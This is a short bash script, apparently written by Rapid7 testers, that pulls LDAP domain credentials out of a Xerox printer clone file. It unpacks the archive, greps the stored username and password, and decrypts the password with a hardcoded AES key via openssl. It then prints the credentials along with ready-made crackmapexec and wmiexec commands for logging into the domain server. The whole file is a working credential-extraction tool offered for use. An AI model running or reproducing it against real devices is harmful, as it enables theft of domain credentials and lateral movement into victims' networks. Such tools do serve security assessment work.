#!/bin/bash
# do not share outside of Rapid7
# per Deral Heiland
# ugly script written by Leon Johnson
echo '
     ___  __   __          __        __   __        __   __   __      ___     ___  __        __  ___  __   __
\_/ |__  |__) /  \ \_/    |__)  /\  /__` /__` |  | /  \ |__) |  \    |__  \_/  |  |__)  /\  /  `  |  /  \ |__)
/ \ |___ |  \ \__/ / \    |    /~~\ .__/ .__/ |/\| \__/ |  \ |__/    |___ / \  |  |  \ /~~\ \__,  |  \__/ |  \'


Yellow='\033[1;93m'
Green='\033[1;32m'
Cyan='\033[0;36m'
Blue='\033[0;34m'
Color_Off='\033[0m'

#echo $Banner

cp $1 test.dlm
sed -i '/^%%/d' $1
tar -xzf test.dlm 2>/dev/null
domain=$(grep ldap.username ./data/cloneStorage/cfg_clone | awk -F '= ' '{print $2}' | awk -F'\' '{print $1}')
username=$(grep ldap.username ./data/cloneStorage/cfg_clone | awk -F '= ' '{print $2}' | awk -F'\' '{print $2}')
hash=$(grep ldap.password ./data/cloneStorage/cfg_clone | awk -F '0x' '{print $2}')
password=$(echo $hash | xxd -r -p | openssl enc -aes-256-cbc --nopad --nosalt -K 36524257707442476d625044626d3334 -iv 0 -d 2>/dev/null)
server=$(grep 'ldap.server\[default\].server =' ./data/cloneStorage/cfg_clone | awk '{print $4}' | cut -d: -f1)
if [[ -n "$username" ]] || [[ -n "$password" ]] || [[ -n "$domain" ]]; then
	echo -e "\n${Green}[+]${Color_Off} Found ldap creds:"
	echo -e "\tServer:\t\t${Yellow}$server${Color_Off}"
	echo -e "\tDomain:\t\t${Yellow}$domain${Color_Off}"
	echo -e "\tUsername:\t${Yellow}$username${Color_Off}"
	echo -e "\tPassword:\t${Yellow}$password${Color_Off}"
	echo -e "\n\tTry: ${Cyan}crackmapexec smb $server -u $username -p '$password'${Color_Off}"
	echo -e "\tTry: ${Cyan}wmiexec.py '$domain/$username:$password'@$server${Color_Off}\n"
else
	echo "No ldap username or password found"
fi
rm CloningManifest.xml
rm -rf data/
rm test.dlm
